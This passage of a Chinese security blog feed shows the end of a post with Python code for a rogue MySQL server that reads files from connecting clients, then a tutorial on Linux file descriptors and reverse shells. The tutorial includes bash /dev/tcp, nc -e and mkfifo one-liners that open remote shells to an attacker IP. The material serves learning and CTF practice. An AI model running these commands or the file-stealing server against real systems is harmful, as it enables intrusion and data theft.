self<span class="token punctuation">.</span>push<span class="token punctuation">(</span>None<span class="token punctuation">)</span>                self<span class="token punctuation">.</span>close_when_done<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            log<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'Unknown state'</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token string">'None'</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>close_when_done<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">mysql_listener</span><span class="token punctuation">(</span>asyncore<span class="token punctuation">.</span>dispatcher<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> sock<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>        asyncore<span class="token punctuation">.</span>dispatcher<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> sock<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> sock<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>create_socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>set_reuse_addr<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">handle_accept</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        pair <span class="token operator">=</span> self<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> pair <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>            log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Conn from: %r'</span><span class="token punctuation">,</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            tmp <span class="token operator">=</span> http_request_handler<span class="token punctuation">(</span>pair<span class="token punctuation">)</span>z <span class="token operator">=</span> mysql_listener<span class="token punctuation">(</span><span class="token punctuation">)</span>daemonize<span class="token punctuation">(</span><span class="token punctuation">)</span>asyncore<span class="token punctuation">.</span>loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><blockquote><p>直接启动，前台监控3306等待响应</p><p>功能较少，但使用方便</p><p>适合CTF做题，靶场测试等</p></blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> logginglogging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span>sv<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>sv<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token number">3306</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sv<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>conn<span class="token punctuation">,</span>address<span class="token operator">=</span>sv<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Conn from: %r'</span><span class="token punctuation">,</span> address<span class="token punctuation">)</span>conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span>logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"auth okay"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span>logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"want file..."</span><span class="token punctuation">)</span>wantfile<span class="token operator">=</span>chr<span class="token punctuation">(</span>len<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00\x00\x01\xFB"</span><span class="token operator">+</span>filenameconn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>wantfile<span class="token punctuation">)</span>content<span class="token operator">=</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span>logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span>content<span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><code>https://yml-sec.top/2019/12/30/%E7%A7%AF%E7%B4%AF%E7%9A%84%E4%B8%80%E4%BA%9Bweb%E9%A2%98%E7%9B%AE/#Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web2</code></p><p><code>https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</code></p><p><code>https://lightless.me/archives/read-mysql-client-file.html</code></p><p><code>https://www.modb.pro/db/120299</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/2021/10/21/%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2021/10/21/%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h1 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h1><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><p>原文地址：<code>https://xz.aliyun.com/t/2548</code></p><p><strong>Linux一切皆文件</strong></p><blockquote><p><strong>linux文件描述符</strong>：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p><p>简单来说就好像指针，Linux通过这个指针（文件描述符）进行文件的读写</p></blockquote><p><strong>Linux启动的时候会默认打开三个文件描述符，分别是：</strong></p><p><strong>标准输入standard input 0 （默认设备键盘）</strong> stdin 0<br><strong>标准输出standard output 1（默认设备显示器）</strong> stdout 1<br><strong>错误输出：error output 2（默认设备显示器）</strong> stderr 2</p><p><img src="20180810173621-d73c1264-9c80-1.png" alt="img"></p><p>之前我一直不明白为什么是<code>stdin 0 stdout 1 stderr 2</code>而不是<code>stdin 0 stdout 0 stderr 0</code></p><p>刚才回头又看了一遍明白了，**<code>stdin、stdout、stderr</code>只是一个标识，用来告诉我们这是标准输入、标准输出还是错误输出**</p><p>而后面的 <strong><code>0、1、2</code>才是真正的文件描述符，/dev/tty是该描述符指向的文件</strong></p><blockquote><p><strong>一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。</strong></p><p><strong>在命令执行前，会先按默认的情况绑定文件描述符</strong></p><p><strong>有时存在例如<code>ls &gt; 1.txt</code>的情况，需要将输出写入文件或者其他设备，就会进行一次重定向</strong></p><p><strong>（1）输入重定向符 &lt; &lt;&lt;**<br>**（2）输出重定向符 &gt; &gt;&gt;</strong></p><p>其他重定向都由这两种衍生</p></blockquote><ul><li><p>/dev/tty</p><p>  <strong>如果当前进程有控制终端(Controlling Terminal)的话，那么/dev/tty就是当前进程的控制终端的设备特殊文件</strong></p></li></ul><p><img src="image-20211014154528680.png" alt="image-20211014154528680"></p><h2 id="bash执行过程"><a href="#bash执行过程" class="headerlink" title="bash执行过程"></a>bash执行过程</h2><blockquote><p>注意：</p></blockquote><p><strong>1.bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</strong></p><p><strong>2.如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果</strong></p><p><strong>3.&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向，重定向就是针对文件描述符的操作</strong></p><blockquote><p>举例</p></blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token operator">&lt;</span> file.txt // 将file.txt的内容输入到cat执行，相当于cat file.txt或者<span class="token function">cat</span> 0<span class="token operator">&lt;</span> file.txt //将file.txt指向文件描述符0<span class="token punctuation">(</span>标准输入 stdin 0<span class="token punctuation">)</span>语法 <span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">&lt;</span>xxx 或者 <span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">></span>xxx n和<span class="token operator">></span>、<span class="token operator">&lt;</span>之间不空格<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211014163245713.png" alt="image-20211014163245713"></p><p> 解析器解析到 “&lt;” 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令。</p><p>相当于文件描述符是一个指针，指向不同的地址，就会产生不同的输入</p><p><img src="image-20211014164105910.png" alt="image-20211014164105910"></p><p><strong>举例：非法指向 stdout 1, 报错</strong></p><p><img src="image-20211014164423875.png" alt="image-20211014164423875"></p><p>指向正确</p><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><p>格式： &amp;&gt; word &gt;&amp; word</p><p>将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1）</p><p><strong>&amp; 符在这里的作用就相当于一个默认的操作，无论进行的操作是0、1或者2，都会进行一次输出</strong></p><p><strong>这样一般用来进行文件描述符之间的操作</strong>，或者将bash报错内容输入进文件中</p><p><img src="image-20211014170343583.png" alt="image-20211014170343583"></p><p><img src="image-20211014170521943.png" alt="image-20211014170521943"></p><h4 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a>文件描述符的复制</h4><p>格式： [n]&lt;&amp;[m] / [n]&gt;&amp;[m]（字符间不能有空格）<br>&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p><p>举例</p><p><img src="image-20211014171219612.png" alt="image-20211014171219612"></p><p>先执行重定向，再从左向右执行命令</p><h4 id="顺序位置的区别"><a href="#顺序位置的区别" class="headerlink" title="顺序位置的区别"></a>顺序位置的区别</h4><p><strong>(1)cmd &gt; file 2&gt;&amp;1</strong></p><p><strong>cmd 命令执行出错，然后错误信息传递给了文件file，本应由file报错，但file的标准错误2又指向了标准输出1，因为重定向执行优先级高于报错输出，所以报错传递给了标准输出1，输入进文件file中</strong></p><p><img src="image-20211014184848539.png" alt="image-20211014184848539"></p><p>相当于<code>cmd 2&gt;&amp;1 &gt; file 2&gt;&amp;1</code></p><p><strong>(2)cmd 2&gt;&amp;1 &gt;file</strong></p><p><strong>cmd命令执行出错，错误信息直接由标准错误2传入标准输出1，重定向优于错误输出，于是报错先指向了文件file，而文件file没有指向，默认由stderr 2处理，所以错误被打印，没有写入file中</strong></p><p>相当于：<code>cmd 2&gt;&amp;1 &gt;file &gt;&amp;2</code></p><p><img src="image-20211014190846397.png" alt="image-20211014190846397"></p><p>所以在将(2)改写为<code>cmd 2&gt;&amp;1 &gt; file 2&gt;&amp;1</code> 效果同（1）一致</p><p>图画的总觉得少了些什么，可我又说不明白，简单理解就是</p><p><strong>将cmd执行返回的内容逐层的给指向的文件，最后由标准输出 stdout 1 输出到文件或者由stderr 2 输出到 终端</strong></p><p>其他的，我也不懂，要么自己悟，要么扒底层吧</p><h3 id="exec-绑定重定向"><a href="#exec-绑定重定向" class="headerlink" title="exec 绑定重定向"></a>exec 绑定重定向</h3><p>exec有两种用法</p><h4 id="exec命令，代替shell"><a href="#exec命令，代替shell" class="headerlink" title="exec命令，代替shell"></a>exec命令，代替shell</h4><p>格式：exec [n] &lt;/&gt; file/[n]</p><p><strong>shell的内建命令exec将并不启动新的shell，而是用要被执行命令替换当前的shell进程，并且将老进程的环境清理掉，而且exec命令后的其它命令将不再执行。</strong> </p><p><strong>因此，如果你在一个shell里面，执行exec ls那么，当列出了当前目录后，这个shell就自己退出了，因为这个shell进程已被替换为仅仅执行ls命令的一个进程，执行结束自然也就退出了。为了避免这个影响我们的使用，一般将exec命令放到一个shell脚本里面，用主脚本调用这个脚本，调用点处可以用bash a.sh，（a.sh就是存放该命令的脚本），这样会为a.sh建立一个sub shell去执行，当执行到exec后，该子脚本进程就被替换成了相应的exec的命令。</strong> </p><p>参考文章：<code>https://blog.csdn.net/qq_31186123/article/details/82190776</code></p><p><img src="image-20211014194013450.png" alt="image-20211014194013450"></p><p>执行exec后将替换原shell进程，导致原shell进程退出</p><p><img src="image-20211014194150674.png" alt="image-20211014194150674"></p><p>写入脚本执行，脚本会重新创建一个shell，exec只会关闭脚本创建的shell</p><p><img src="image-20211014194404388.png" alt="image-20211014194404388"></p><p>exec执行后会关闭当前的shell ，exec后的命令无法执行</p><h4 id="exec文件重定向"><a href="#exec文件重定向" class="headerlink" title="exec文件重定向"></a>exec文件重定向</h4><p><strong>当exec命令来对文件描述符操作的时候，就不会替换shell，而且操作完成后，还会继续执行接下来的命令。</strong> </p><p><strong>格式举例：<code> [n]&lt;&gt;word</code></strong></p><p>例如：</p><p><img src="image-20211016195850968.png" alt="image-20211016195850968"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">exec</span> 3<span class="token operator">&lt;</span><span class="token operator">></span> <span class="token function">file</span> 首先应该明确，文件描述符有且只有0、1、2，不存在3<span class="token function">exec</span> 3<span class="token operator">&lt;</span><span class="token operator">></span>file 即可以理解未创建了一个文件描述符3，将3指向文件file的stdin 0 和 stdout 1<span class="token function">ls</span> <span class="token operator">></span><span class="token operator">&amp;</span>3将ls执行的内容传递给上面创建的文件描述符上一步描述符3指向了file,所以这就是将ls命令得到的内容指向了file<span class="token function">cat</span> <span class="token function">file</span>查看file内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>相当于：exec 3&gt; file &gt;&1;exec 3&lt; file &lt;&amp;0</strong></p></blockquote><p><img src="image-20211016211411642.png" alt="image-20211016211411642"></p><p>刚才的操作结束后fd 目录下多了文件描述符3</p><p><img src="image-20211016211503932.png" alt="image-20211016211503932"></p><p>3中包含我们操作的信息</p><p><img src="image-20211016211608291.png" alt="image-20211016211608291"></p><p>指向也正确</p><blockquote><p>exec 3&lt;&amp;-  用于删除自定义的文件描述符，使用时注意不要删了系统定义的0、1、2、255</p><p>255是一个小技巧,bash用于在重定向时保留这些副本</p><p>例：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> foo 1<span class="token operator">></span>/dev/null 2<span class="token operator">></span>/dev/null <span class="token operator">></span>/proc/$$/fd/255输出：foo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p>另外,这个命令还可以作为find命令的一个选项,如下所示:<br>(1)在当前目录下(包含子目录)，查找所有txt文件并找出含有字符串”bin”的行<br>find ./ -name “<em>.txt” -exec grep “bin” {} ;<br>(2)在当前目录下(包含子目录)，删除所有txt文件<br>find ./ -name “</em>.txt” -exec rm {} ; </p><h2 id="反弹shell概述"><a href="#反弹shell概述" class="headerlink" title="反弹shell概述"></a>反弹shell概述</h2><p>原文地址：<code>https://xz.aliyun.com/t/2549</code></p><p><strong>reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</strong></p><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p><p><img src="image-20211016213338827.png" alt="image-20211016213338827"></p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><pre class="line-numbers language-bash"><code class="language-bash">攻击方nc -lvp 2333 监控攻击方自己服务器的2333端口被攻击方<span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/xxx.xxx.xxx.xxx/2333 0<span class="token operator">></span><span class="token operator">&amp;</span>1将bash -i 的执行结果传给ip为 xxx.xxx.xxx.xxx 的服务器，0<span class="token operator">></span><span class="token operator">&amp;</span>1将攻击机的stdin 0指向被攻击机，执行后指回stdout 1然而前面的bash -i <span class="token operator">></span><span class="token operator">&amp;</span> 实际上已经将stdout 1指向攻击机，于是执行结果在攻击机显示-i 产生交互式shell注：Linux一切皆文件，执行结果传给/dev/tcp/xxx.xxx.xxx.xxx/2333件相当于发送给了 xxx.xxx.xxx.xxx:2333<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="20180810173608-cf98d0ec-9c80-1.png" alt="img"></p><p><img src="image-20211016221124273.png" alt="image-20211016221124273"></p><p><img src="image-20211016221150779.png" alt="image-20211016221150779"></p><blockquote><p><strong>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的</strong></p><p>在一方监听了端口的情况，通过向这个文件些内容，可以直接发送给监听的服务器，实现socket通信</p></blockquote><p><img src="7998721.jpg" alt="img"></p><p>java网络编程就有讲这方面内容</p><p><img src="image-20211016220952544.png" alt="image-20211016220952544"></p><p><img src="image-20211016221020264.png" alt="image-20211016221020264"></p><blockquote><p>先知里告诉我这条语句<code>bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</code>执行的命令任然会在被攻击机显示</p><p>让我懵了回，因为我没这情况，<strong>研究了会才发现，我上面写的是 <code>bash -i &amp;&gt; </code>，先知是<code>bash -i &gt;</code></strong></p><p>有什么区别？</p><p><strong><code>bash &amp;&gt;</code> 将stdout 1和stderr 2混合起来都指向攻击机，无论被攻击机执行的shell正确还是错误，都会因为 <code>&amp;&gt;</code>指回攻击机</strong></p><p><strong><code>bash &gt;</code> 没有&amp;，所以Linux默认<code>bash 1&gt; </code>这样做只有stdout 1指向了攻击机，被攻击机stdout 2的执行任然回显在被攻击机上，没有送达攻击机</strong></p><p>虽说这条“有问题的payload”我就没测试过去</p><p>所以先知又给了几条payload</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span> /dev/tcp/192.168.146.129/2333 0<span class="token operator">></span><span class="token operator">&amp;</span>1 2<span class="token operator">></span><span class="token operator">&amp;</span>1//加了 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.146.129/2333 0<span class="token operator">></span><span class="token operator">&amp;</span>1//先指向stdout 1和stderr 2，在交给攻击机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="常见的反弹shell方法-摘自先知"><a href="#常见的反弹shell方法-摘自先知" class="headerlink" title="常见的反弹shell方法(摘自先知)"></a>常见的反弹shell方法(摘自先知)</h2><p>其他的没什么好说的，主要说说这几句</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">exec</span> 5<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/192.168.146.129/2333<span class="token punctuation">;</span><span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token operator">&amp;</span>5<span class="token operator">|</span><span class="token keyword">while</span> <span class="token function">read</span> line<span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token variable">$line</span> <span class="token operator">></span><span class="token operator">&amp;</span>5 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span class="token punctuation">;</span><span class="token keyword">done</span>nc -e /bin/sh 192.168.146.129 2333<span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/sh -i 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span class="token operator">|</span>nc 192.168.146.129 2333 <span class="token operator">></span>/tmp/f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="第一句"><a href="#第一句" class="headerlink" title="第一句"></a>第一句</h3><p><code>exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</code></p><p>这句分为两个部分</p><h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p><code>exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;</code></p><p>这段很好理解，创建一个文件描述符5 , 指向<code>/dev/tcp/192.168.146.129/2333</code></p><p>使用<code>&lt;&gt;</code>既将文件描述符的内容输入攻击者服务器，有将攻击者指令交给文件描述符 5</p><h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p><code>cat &lt;&amp;5</code></p><p>也没什么可说的，将描述符5的stdout 1 和 stderr 2混合交给cat 打印</p><p><strong><code>|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</code></strong></p><p>这里是重点</p><p>这里应该这样看</p><pre class="line-numbers language-bash"><code class="language-bash">//假设一个情景，攻击者发送了一个ls命令<span class="token function">exec</span> 5<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/192.168.146.129/2333/*ls 被发送到文件描述符5*/<span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token operator">&amp;</span>5 /*cat 执行描述符5*/<span class="token keyword">while</span> <span class="token function">read</span> line/*读取管道符前cat <span class="token operator">&lt;</span><span class="token operator">&amp;</span>5的结果，每读取一行，就将一行内容赋值给line* 也就是读到了ls的内容*/<span class="token keyword">do</span>     <span class="token variable">$line</span> <span class="token operator">></span><span class="token operator">&amp;</span>5 2<span class="token operator">></span><span class="token operator">&amp;</span>1    /*do<span class="token punctuation">..</span>.done循环    *将读到的内容传给描述符5 ，并将stderr 2指向stdout 1    */<span class="token keyword">done</span> //描述符5中的内容通过exec 5<span class="token operator">></span> /dev/<span class="token punctuation">..</span>.发给攻击机，形成循环<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="第二句"><a href="#第二句" class="headerlink" title="第二句"></a>第二句</h3><p><code>nc -e /bin/sh 192.168.146.129 2333</code></p><p>nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）</p><h3 id="第三句"><a href="#第三句" class="headerlink" title="第三句"></a>第三句</h3><p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;/tmp/f</code></p><p>在第二句无法成功时（没有nc -e 时，使用这句）</p><blockquote><p>mkfifo命令的基础用法</p></blockquote><p>管道：将前面的每一个进程的输出，直接作为下一个进程的输入，管道符为<code>|</code></p><p>常见管道命令</p><ul><li>cut、grep、sort、wc、uniq</li><li>tee：重定向，既能在屏幕输出，又能保存到文件中</li><li>tr、col、join、paste、expand、split</li></ul><p><strong>mkfifo则可以创建命名管道</strong></p><pre class="line-numbers language-bash"><code class="language-bash">例如：mkfifo pipe2pipe2就是一个命名管道。作用：在第一个终端执行<span class="token function">ls</span> <span class="token operator">></span> pipe2在第二个终端执行<span class="token function">cat</span> <span class="token operator">&lt;</span> pipe2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明确，和重定向很像</p><p>那么这就很好理解了</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span> // 先删除一下可能存在的自定义的管道<span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span> // 创建一个管道符/tmp/f<span class="token punctuation">[</span>创建到tmp目录是因为tmp目录有足够的权限<span class="token punctuation">]</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/sh -i 2<span class="token operator">></span><span class="token operator">&amp;</span>1 // 用cat读取管道的内容，交给/bin/sh【即bash】,stderr 2 <span class="token operator">></span><span class="token operator">&amp;</span>1<span class="token operator">|</span>nc 192.168.146.129 2333 // 将结果传递给攻击机<span class="token operator">></span>/tmp/f //将攻击机输出传递给管道，形成循环<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过revengephp理解thinkphp反序列化链</title>
      <link href="/2021/10/03/%E9%80%9A%E8%BF%87revengephp%E7%90%86%E8%A7%A3thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"/>
      <url>/2021/10/03/%E9%80%9A%E8%BF%87revengephp%E7%90%86%E8%A7%A3thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
      
